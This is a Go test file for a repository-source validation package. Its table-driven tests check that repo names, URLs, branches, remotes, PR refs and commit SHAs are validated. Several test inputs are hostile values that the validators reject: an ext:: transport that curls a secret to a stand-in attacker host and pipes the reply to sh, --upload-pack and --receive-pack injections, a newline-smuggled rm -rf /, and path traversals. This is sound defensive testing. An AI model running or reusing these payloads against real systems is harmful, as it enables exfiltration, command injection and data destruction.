package reposource_test

import (
	"errors"
	"testing"

	"github.com/narvidev/narvi/internal/domain/reposource"
)

func TestValidateRepoName(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		in         string
		wantErr    bool
		wantReason error
	}{
		{name: "simple name is valid", in: "widgets"},
		{name: "name with dashes/underscores/dots is valid", in: "my-repo_v1.2"},
		{name: "single-character name is valid", in: "a"},
		{
			name:       "empty name is rejected (charset requires at least one char)",
			in:         "",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			name:       "bare . is rejected",
			in:         ".",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameDotSegment,
		},
		{
			name:       "bare .. is rejected",
			in:         "..",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameDotSegment,
		},
		{
			name:       "../../etc traversal is rejected (contains /)",
			in:         "../../etc",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			name:       "leading slash is rejected",
			in:         "/etc",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			name:       "character-class glob-escape trick [.][.]/etc is rejected",
			in:         "[.][.]/etc",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			name:       `backslash-escape trick \.\./etc is rejected`,
			in:         `\.\./etc`,
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			name:       "embedded null byte is rejected",
			in:         "widgets\x00",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			name:       "space is rejected",
			in:         "wid gets",
			wantErr:    true,
			wantReason: reposource.ErrRepoNameCharset,
		},
		{
			// foo..bar is NOT a ".." segment -- it's a single valid path
			// segment whose charset happens to include two consecutive
			// dots in the middle. Only the EXACT literal ".." is rejected.
			name: "foo..bar is not rejected (not the literal .. segment)",
			in:   "foo..bar",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := reposource.ValidateRepoName(tc.in)
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("ValidateRepoName(%q) = %v, want nil", tc.in, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("ValidateRepoName(%q) = nil, want error wrapping %v", tc.in, tc.wantReason)
			}
			if !errors.Is(err, tc.wantReason) {
				t.Errorf("ValidateRepoName(%q) = %v, want error wrapping %v", tc.in, err, tc.wantReason)
			}
			var nameErr *reposource.InvalidRepoNameError
			if !errors.As(err, &nameErr) {
				t.Fatalf("ValidateRepoName(%q) error is not *InvalidRepoNameError: %v", tc.in, err)
			}
			if nameErr.Error() == "" {
				t.Error("InvalidRepoNameError.Error() is empty")
			}
		})
	}
}

func TestValidateRepoURL(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		in         string
		wantErr    bool
		wantReason error
	}{
		{name: "valid https URL", in: "https://github.com/org/repo.git"},
		{name: "valid https URL with port", in: "https://git.example.com:8443/org/repo.git"},
		{
			name:       "ext:: transport is rejected",
			in:         `ext::sh -c "curl attacker/$(cat /some/secret)|sh"`,
			wantErr:    true,
			wantReason: reposource.ErrURLSchemeNotHTTPS,
		},
		{
			name:       "fd:: transport is rejected",
			in:         "fd::5",
			wantErr:    true,
			wantReason: reposource.ErrURLSchemeNotHTTPS,
		},
		{
			name:       "bare -prefixed string is rejected",
			in:         "--upload-pack=touch /tmp/pwned;",
			wantErr:    true,
			wantReason: reposource.ErrURLSchemeNotHTTPS,
		},
		{
			name:       "plain http scheme is rejected",
			in:         "http://github.com/org/repo.git",
			wantErr:    true,
			wantReason: reposource.ErrURLSchemeNotHTTPS,
		},
		{
			name:       "ssh scheme is rejected",
			in:         "ssh://git@github.com/org/repo.git",
			wantErr:    true,
			wantReason: reposource.ErrURLSchemeNotHTTPS,
		},
		{
			name:       "file scheme is rejected",
			in:         "file:///etc/passwd",
			wantErr:    true,
			wantReason: reposource.ErrURLSchemeNotHTTPS,
		},
		{
			// net/url.Parse itself refuses this shape outright ("first
			// path segment in URL cannot contain colon") before the
			// scheme check is ever reached.
			name:       "scp-like git@ shorthand (no scheme) is rejected",
			in:         "git@github.com:org/repo.git",
			wantErr:    true,
			wantReason: reposource.ErrURLNotParseable,
		},
		{
			name:       "https scheme with no host is rejected",
			in:         "https:///org/repo.git",
			wantErr:    true,
			wantReason: reposource.ErrURLNoHost,
		},
		{
			name:       "unparseable URL is rejected",
			in:         "https://%zz",
			wantErr:    true,
			wantReason: reposource.ErrURLNotParseable,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := reposource.ValidateRepoURL(tc.in)
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("ValidateRepoURL(%q) = %v, want nil", tc.in, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("ValidateRepoURL(%q) = nil, want error wrapping %v", tc.in, tc.wantReason)
			}
			if !errors.Is(err, tc.wantReason) {
				t.Errorf("ValidateRepoURL(%q) = %v, want error wrapping %v", tc.in, err, tc.wantReason)
			}
			var urlErr *reposource.InvalidRepoURLError
			if !errors.As(err, &urlErr) {
				t.Fatalf("ValidateRepoURL(%q) error is not *InvalidRepoURLError: %v", tc.in, err)
			}
			if urlErr.Error() == "" {
				t.Error("InvalidRepoURLError.Error() is empty")
			}
		})
	}
}

func TestValidateBranch(t *testing.T) {
	t.Parallel()
	testValidateRef(t, "branch", reposource.ValidateBranch)
}

// testValidateRef runs the shared table ValidateBranch must satisfy
// (validateRef's own rules) -- kind is used only to build readable subtest
// names. ValidateRemoteName no longer shares this table (see
// TestValidateRemoteName below): a remote name's own rule is the stricter
// charset allowlist ValidateRepoName uses, not validateRef's permissive
// "reject empty/leading-dash/control-chars only" rule -- most notably, a
// name containing "/" (e.g. "feature/foo") is legitimate for a branch but
// must be REJECTED for a remote, so the two validators' test tables must
// not be conflated.
func testValidateRef(t *testing.T, kind string, validate func(string) error) {
	t.Helper()

	tests := []struct {
		name       string
		in         string
		wantErr    bool
		wantReason error
	}{
		{name: "simple name is valid", in: "main"},
		{name: "name with slash is valid (e.g. feature branches)", in: "feature/foo"},
		{
			name:       "empty is rejected",
			in:         "",
			wantErr:    true,
			wantReason: reposource.ErrRefEmpty,
		},
		{
			name:       "leading dash is rejected (--receive-pack=<cmd> injection shape)",
			in:         "--receive-pack=touch /tmp/pwned",
			wantErr:    true,
			wantReason: reposource.ErrRefDashPrefix,
		},
		{
			name:       "bare single dash is rejected",
			in:         "-",
			wantErr:    true,
			wantReason: reposource.ErrRefDashPrefix,
		},
		{
			name:       "embedded newline is rejected",
			in:         "main\nrm -rf /",
			wantErr:    true,
			wantReason: reposource.ErrRefControlChar,
		},
		{
			name:       "embedded tab is rejected",
			in:         "main\tfoo",
			wantErr:    true,
			wantReason: reposource.ErrRefControlChar,
		},
		{
			name:       "embedded DEL is rejected",
			in:         "main\x7f",
			wantErr:    true,
			wantReason: reposource.ErrRefControlChar,
		},
	}

	for _, tc := range tests {
		t.Run(kind+"/"+tc.name, func(t *testing.T) {
			t.Parallel()
			err := validate(tc.in)
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("Validate%s(%q) = %v, want nil", kind, tc.in, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("Validate%s(%q) = nil, want error wrapping %v", kind, tc.in, tc.wantReason)
			}
			if !errors.Is(err, tc.wantReason) {
				t.Errorf("Validate%s(%q) = %v, want error wrapping %v", kind, tc.in, err, tc.wantReason)
			}
			var refErr *reposource.InvalidRefError
			if !errors.As(err, &refErr) {
				t.Fatalf("Validate%s(%q) error is not *InvalidRefError: %v", kind, tc.in, err)
			}
			if refErr.Kind != kind {
				t.Errorf("InvalidRefError.Kind = %q, want %q", refErr.Kind, kind)
			}
			if refErr.Error() == "" {
				t.Error("InvalidRefError.Error() is empty")
			}
		})
	}
}

// TestValidatePullHeadRef pins the one shape a pull request head ref may
// take before it is fetched: refs/pull/<number>/head, the number positive,
// without a leading zero, at most ten digits. Anything else -- an option, a
// glob, another namespace, a path escape -- is refused.
func TestValidatePullHeadRef(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		in      string
		wantErr bool
	}{
		{name: "a pull request's head ref", in: "refs/pull/7/head"},
		{name: "ten digits", in: "refs/pull/1234567890/head"},
		{name: "eleven digits", in: "refs/pull/12345678901/head", wantErr: true},
		{name: "number zero", in: "refs/pull/0/head", wantErr: true},
		{name: "leading zero", in: "refs/pull/07/head", wantErr: true},
		{name: "negative number", in: "refs/pull/-7/head", wantErr: true},
		{name: "the merge ref", in: "refs/pull/7/merge", wantErr: true},
		{name: "a branch", in: "refs/heads/main", wantErr: true},
		{name: "a glob", in: "refs/pull/*/head", wantErr: true},
		{name: "an option", in: "--upload-pack=touch /tmp/pwned", wantErr: true},
		{name: "a force prefix", in: "+refs/pull/7/head", wantErr: true},
		{name: "a refspec", in: "refs/pull/7/head:refs/heads/main", wantErr: true},
		{name: "a path escape", in: "refs/pull/7/../../head", wantErr: true},
		{name: "a trailing newline", in: "refs/pull/7/head\n", wantErr: true},
		{name: "empty", in: "", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := reposource.ValidatePullHeadRef(tt.in)
			if (err != nil) != tt.wantErr {
				t.Fatalf("ValidatePullHeadRef(%q) error = %v, wantErr %v", tt.in, err, tt.wantErr)
			}
			if err != nil && !errors.Is(err, reposource.ErrPullHeadRefShape) {
				t.Errorf("ValidatePullHeadRef(%q) error = %v, want errors.Is ErrPullHeadRefShape", tt.in, err)
			}
		})
	}
}

// TestValidateCommitSHA pins the commit ids a checkout accepts: a full
// SHA-1 name in lowercase hex, never abbreviated, never a SHA-256 name the
// agent's SHA-1 git-dir cannot check out, never a revision expression or
// an option.
func TestValidateCommitSHA(t *testing.T) {
	t.Parallel()

	sha1 := "0123456789abcdef0123456789abcdef01234567"
	sha256 := sha1 + "89abcdef0123456789abcdef"
	tests := []struct {
		name    string
		in      string
		wantErr bool
	}{
		{name: "a SHA-1 name", in: sha1},
		{name: "a SHA-256 name", in: sha256, wantErr: true},
		{name: "abbreviated", in: sha1[:12], wantErr: true},
		{name: "41 characters", in: sha1 + "8", wantErr: true},
		{name: "63 characters", in: sha256[:63], wantErr: true},
		{name: "uppercase", in: "0123456789ABCDEF0123456789ABCDEF01234567", wantErr: true},
		{name: "a revision expression", in: sha1[:38] + "^1", wantErr: true},
		{name: "an option", in: "--orphan=0123456789abcdef0123456789abcdef", wantErr: true},
		{name: "a branch", in: "main", wantErr: true},
		{name: "a trailing newline", in: sha1 + "\n", wantErr: true},
		{name: "empty", in: "", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := reposource.ValidateCommitSHA(tt.in)
			if (err != nil) != tt.wantErr {
				t.Fatalf("ValidateCommitSHA(%q) error = %v, wantErr %v", tt.in, err, tt.wantErr)
			}
			if err != nil && !errors.Is(err, reposource.ErrCommitSHAShape) {
				t.Errorf("ValidateCommitSHA(%q) error = %v, want errors.Is ErrCommitSHAShape", tt.in, err)
			}
		})
	}
}

// TestPullHeadRef pins the ref a pull request number names, and that a
// number that is not positive gives one ValidatePullHeadRef refuses.
func TestPullHeadRef(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name      string
		in        int32
		want      string
		wantValid bool
	}{
		{name: "pull request 7", in: 7, want: "refs/pull/7/head", wantValid: true},
		{name: "the largest number", in: 2147483647, want: "refs/pull/2147483647/head", wantValid: true},
		{name: "zero", in: 0, want: "refs/pull/0/head"},
		{name: "negative", in: -3, want: "refs/pull/-3/head"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := reposource.PullHeadRef(tt.in)
			if got != tt.want {
				t.Fatalf("PullHeadRef(%d) = %q, want %q", tt.in, got, tt.want)
			}
			if valid := reposource.ValidatePullHeadRef(got) == nil; valid != tt.wantValid {
				t.Errorf("ValidatePullHeadRef(PullHeadRef(%d)) valid = %v, want %v", tt.in, valid, tt.wantValid)
			}
		})
	}
}

// TestValidateRemoteName proves ValidateRemoteName's own rule: the SAME
// charset allowlist ValidateRepoName uses ([a-zA-Z0-9_.-]+, plus the
// explicit "."/".." dot-segment rejection), NOT validateRef's permissive
// "reject empty/leading-dash/control-chars only" rule ValidateBranch still
// uses. This closes the exact gap an adversarial review confirmed live: a
// Remote value shaped like a filesystem path to an attacker-controlled
// rogue bare repo (no leading dash, no control characters -- so it used to
// pass validateRef's rule cleanly) is now rejected outright, and so is
// every git alternate-transport string ("ext::", "fd::", ...), since both
// "/" and ":" fall outside the allowed charset.
func TestValidateRemoteName(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		in         string
		wantErr    bool
		wantReason error
	}{
		{name: "origin is valid", in: "origin"},
		{name: "upstream is valid", in: "upstream"},
		{name: "my-fork (dash) is valid", in: "my-fork"},
		{name: "fork_2 (underscore/digit) is valid", in: "fork_2"},
		{
			name:       "empty is rejected (charset requires at least one char)",
			in:         "",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			name:       "bare . is rejected",
			in:         ".",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameDotSegment,
		},
		{
			name:       "bare .. is rejected",
			in:         "..",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameDotSegment,
		},
		{
			// The exact attack an adversarial review confirmed live: a
			// Remote value that is a filesystem path to a rogue bare git
			// repo -- no leading dash, no control characters, so it used
			// to pass validateRef's old shared rule cleanly, and a real
			// two-repo proof showed `git push` genuinely redirecting the
			// sandbox's real commit to this path instead of the real
			// "origin". The charset allowlist (no "/" allowed at all)
			// rejects it outright.
			name:       "absolute filesystem path to a rogue destination repo is rejected",
			in:         "/tmp/attacker-controlled-rogue-bare-repo.git",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			name:       "relative filesystem path to a rogue destination repo is rejected",
			in:         "../../tmp/attacker-controlled-rogue-bare-repo.git",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			name:       "multi-segment path (no leading slash) is rejected",
			in:         "some/other/repo.git",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			name:       "ext:: transport is rejected",
			in:         `ext::sh -c "curl attacker/$(cat /some/secret)|sh"`,
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			name:       "fd:: transport is rejected",
			in:         "fd::5",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			// The original argument-injection shape this package's own
			// leading-dash rule (still used by ValidateBranch) was built
			// for -- now rejected by the charset rule instead (this
			// value contains "=" and " ", both outside the allowlist),
			// so the argument-injection class stays closed for remotes
			// too, just via a different rule than before.
			name:       "leading-dash argument injection is still rejected",
			in:         "--receive-pack=touch /tmp/pwned",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
		{
			// feature/foo is legitimate for ValidateBranch (see
			// testValidateRef above) but must be REJECTED for
			// ValidateRemoteName -- the two validators are deliberately
			// no longer the same rule.
			name:       "slash-containing branch-shaped value is rejected for remote",
			in:         "feature/foo",
			wantErr:    true,
			wantReason: reposource.ErrRemoteNameCharset,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := reposource.ValidateRemoteName(tc.in)
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("ValidateRemoteName(%q) = %v, want nil", tc.in, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("ValidateRemoteName(%q) = nil, want error wrapping %v", tc.in, tc.wantReason)
			}
			if !errors.Is(err, tc.wantReason) {
				t.Errorf("ValidateRemoteName(%q) = %v, want error wrapping %v", tc.in, err, tc.wantReason)
			}
			var remoteErr *reposource.InvalidRemoteNameError
			if !errors.As(err, &remoteErr) {
				t.Fatalf("ValidateRemoteName(%q) error is not *InvalidRemoteNameError: %v", tc.in, err)
			}
			if remoteErr.Error() == "" {
				t.Error("InvalidRemoteNameError.Error() is empty")
			}
		})
	}
}

// TestParseOwnerRepo is table-driven over the shapes this codebase's two
// original, byte-for-byte-identical forks (internal/app/imagebuild/
// builder.go's own parseOwnerRepo and internal/app/sessionactor/
// pushpr.go's own parseOwnerRepo, both deleted by audit-remediation batch
// B3 in favor of this one shared reposource.ParseOwnerRepo) each already
// had their own pre-existing test coverage for: a plain https URL,
// with/without a trailing ".git" suffix, with/without a trailing slash, a
// non-GitHub host parsed generically (ParseOwnerRepo itself is
// deliberately host-agnostic -- see its own doc comment; a caller that
// also needs to reject an unsupported host calls CheckRepoHost
// separately, proven below), and the malformed-input shapes (too few/too
// many path segments, an empty path, an unparseable URL) that must error
// rather than silently return a garbage owner/repo.
func TestParseOwnerRepo(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name      string
		url       string
		wantOwner string
		wantRepo  string
		wantErr   bool
	}{
		{"plain https", "https://github.com/narvidev/narvi", "narvidev", "narvi", false},
		{"dot-git suffix", "https://github.com/narvidev/narvi.git", "narvidev", "narvi", false},
		{"trailing slash", "https://github.com/narvidev/narvi/", "narvidev", "narvi", false},
		{"gitlab host (generic parsing)", "https://gitlab.com/some-group/some-repo.git", "some-group", "some-repo", false},
		{"too few path segments", "https://github.com/narvidev", "", "", true},
		{"too many path segments", "https://github.com/narvidev/narvi/extra", "", "", true},
		{"empty path", "https://github.com/", "", "", true},
		{"malformed url", "://not a url", "", "", true},
		// Audit-remediation batch B3 round 2 (finding #8): ParseOwnerRepo's
		// own doc comment explicitly flags a future ".git"-trim correctness
		// fix (aligning with NormalizeRepoURL's own documented ".git"
		// collision caveat) as an anticipated edit to this exact function --
		// these two cases exercise the guard clause (parts[0] == "" ||
		// parts[1] == "") that fix must not regress: a future edit that
		// trims ".git" PER-SEGMENT (rather than on the whole trimmed path,
		// as today) could plausibly start returning owner="narvidev",
		// repo="" for the first case instead of erroring.
		{"trailing .git with no repo segment (empty repo after trim)", "https://github.com/narvidev/.git", "", "", true},
		{"embedded double slash (empty owner segment)", "https://github.com//narvi", "", "", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			owner, repo, err := reposource.ParseOwnerRepo(tc.url)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("ParseOwnerRepo(%q) = (%q, %q, nil), want an error", tc.url, owner, repo)
				}
				return
			}
			if err != nil {
				t.Fatalf("ParseOwnerRepo(%q) unexpected error: %v", tc.url, err)
			}
			if owner != tc.wantOwner || repo != tc.wantRepo {
				t.Errorf("ParseOwnerRepo(%q) = (%q, %q), want (%q, %q)", tc.url, owner, repo, tc.wantOwner, tc.wantRepo)
			}
		})
	}
}

// TestSplitFullName proves SplitFullName's own simple "<owner>/<repo>"
// split ("review sessions", §8.2) -- moved here from what used to
// be internal/adapters/inbound/github/headresolve_test.go's own
// TestSplitOwnerRepo (identical cases, carried over verbatim) when the
// function itself moved to become this package's SplitFullName (that
// file's own doc comment names the second caller this move was for).
func TestSplitFullName(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name      string
		fullName  string
		wantOwner string
		wantRepo  string
		wantOK    bool
	}{
		{name: "well-formed", fullName: "acme/widgets", wantOwner: "acme", wantRepo: "widgets", wantOK: true},
		{name: "no slash", fullName: "widgets", wantOK: false},
		{name: "empty owner", fullName: "/widgets", wantOK: false},
		{name: "empty repo", fullName: "acme/", wantOK: false},
		{name: "empty string", fullName: "", wantOK: false},
		{name: "extra path segment (repo half keeps the trailing slash content)", fullName: "acme/widgets/extra", wantOwner: "acme", wantRepo: "widgets/extra", wantOK: true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			owner, repo, ok := reposource.SplitFullName(tc.fullName)
			if ok != tc.wantOK {
				t.Fatalf("SplitFullName(%q) ok = %v, want %v", tc.fullName, ok, tc.wantOK)
			}
			if ok && (owner != tc.wantOwner || repo != tc.wantRepo) {
				t.Errorf("SplitFullName(%q) = (%q, %q), want (%q, %q)", tc.fullName, owner, repo, tc.wantOwner, tc.wantRepo)
			}
		})
	}
}

// TestCheckRepoHost proves the shared host-allowlist check audit-
// remediation batch B3 adds: a repo URL naming an allowed host passes; a
// well-formed repo URL naming a host NOT in the allowlist is rejected via
// the DISTINCT *UnsupportedRepoHostError type (never confused with a
// malformed-URL rejection); and a URL that fails to parse at all is
// rejected via the SAME *InvalidRepoURLError/ErrURLNotParseable
// ValidateRepoURL itself already returns for that case -- proving a
// caller really can tell "malformed URL" and "unsupported host" apart via
// errors.As on two different concrete types.
func TestCheckRepoHost(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name         string
		url          string
		allowedHosts []string
		wantErr      bool
		wantHostErr  bool // wantErr && this: expect *UnsupportedRepoHostError specifically
	}{
		{
			name:         "github.com is allowed",
			url:          "https://github.com/acme/widgets",
			allowedHosts: []string{"github.com"},
		},
		{
			name:         "host match is case-insensitive",
			url:          "https://GitHub.COM/acme/widgets",
			allowedHosts: []string{"github.com"},
		},
		{
			name:         "one of several allowed hosts matches",
			url:          "https://gitlab.example.com/acme/widgets",
			allowedHosts: []string{"github.com", "gitlab.example.com"},
		},
		{
			name:         "gitlab host is rejected when only github.com is allowed",
			url:          "https://gitlab.example.com/acme/widgets",
			allowedHosts: []string{"github.com"},
			wantErr:      true,
			wantHostErr:  true,
		},
		{
			name:         "no allowed hosts at all rejects everything",
			url:          "https://github.com/acme/widgets",
			allowedHosts: nil,
			wantErr:      true,
			wantHostErr:  true,
		},
		{
			name:         "unparseable url is rejected as malformed, not as an unsupported host",
			url:          "https://%zz",
			allowedHosts: []string{"github.com"},
			wantErr:      true,
			wantHostErr:  false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			err := reposource.CheckRepoHost(tc.url, tc.allowedHosts...)
			if !tc.wantErr {
				if err != nil {
					t.Fatalf("CheckRepoHost(%q, %v) = %v, want nil", tc.url, tc.allowedHosts, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("CheckRepoHost(%q, %v) = nil, want an error", tc.url, tc.allowedHosts)
			}

			var hostErr *reposource.UnsupportedRepoHostError
			var urlErr *reposource.InvalidRepoURLError
			gotHostErr := errors.As(err, &hostErr)
			gotURLErr := errors.As(err, &urlErr)
			if gotHostErr == gotURLErr {
				t.Fatalf("CheckRepoHost(%q, %v) = %v, want exactly one of *UnsupportedRepoHostError/*InvalidRepoURLError, got hostErr=%v urlErr=%v", tc.url, tc.allowedHosts, err, gotHostErr, gotURLErr)
			}
			if tc.wantHostErr {
				if !gotHostErr {
					t.Fatalf("CheckRepoHost(%q, %v) = %v, want *UnsupportedRepoHostError", tc.url, tc.allowedHosts, err)
				}
				if !errors.Is(err, reposource.ErrRepoHostNotSupported) {
					t.Errorf("CheckRepoHost(%q, %v) = %v, want it to wrap ErrRepoHostNotSupported", tc.url, tc.allowedHosts, err)
				}
				if hostErr.Error() == "" {
					t.Error("UnsupportedRepoHostError.Error() is empty")
				}
			} else {
				if !gotURLErr {
					t.Fatalf("CheckRepoHost(%q, %v) = %v, want *InvalidRepoURLError", tc.url, tc.allowedHosts, err)
				}
				if !errors.Is(err, reposource.ErrURLNotParseable) {
					t.Errorf("CheckRepoHost(%q, %v) = %v, want it to wrap ErrURLNotParseable", tc.url, tc.allowedHosts, err)
				}
			}
		})
	}
}
